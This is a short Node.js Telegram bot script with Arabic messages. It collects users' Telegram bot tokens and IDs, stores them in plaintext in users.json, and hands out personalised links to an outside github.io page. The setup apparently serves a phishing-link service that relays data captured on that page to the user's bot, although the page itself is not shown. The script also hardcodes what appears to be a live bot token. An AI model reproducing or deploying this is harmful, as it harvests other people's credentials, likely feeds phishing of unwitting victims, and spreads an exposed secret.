import { Telegraf } from 'telegraf';
import fs from 'fs';
import http from 'http';

const mainBot = new Telegraf('8180329300:AAFg-ruLWrlFkoPAy8Lu-gXIGHNkDNfK0O4');

function loadUsers() {
  try {
    return JSON.parse(fs.readFileSync('users.json'));
  } catch {
    return {};
  }
}

function saveUsers(users) {
  fs.writeFileSync('users.json', JSON.stringify(users, null, 2));
}

const users = loadUsers();

mainBot.start((ctx) => {
  ctx.reply('👋 أهلاً بك! ما هو اسمك؟ 🤔');
});

mainBot.on('text', (ctx) => {
  const chatId = ctx.chat.id.toString();
  const text = ctx.message.text;
  
  if (!users[chatId]) {
    if (/^\d{9,}$/.test(text) || text.includes(':')) {
      if (!users[chatId]) users[chatId] = {};
      if (!users[chatId].token && text.includes(':')) {
        users[chatId].token = text;
        ctx.reply('🔒 أرسل الآن الـ ID الخاص بك:');
      } else if (!users[chatId].id && /^\d{9,}$/.test(text)) {
        users[chatId].id = text;
        ctx.reply(`✅ تم الحفظ!
رابطك الخاص:
https://qwertyuiopqw12.github.io/Boot-/?ref=${text}`);
        saveUsers(users);
      }
    }
  }
});

mainBot.launch();
console.log('🤖 تم تشغيل البوت!');

// تحايل لفتح منفذ وهمي لتجنب خطأ Render
http.createServer(() => {}).listen(process.env.PORT || 3000);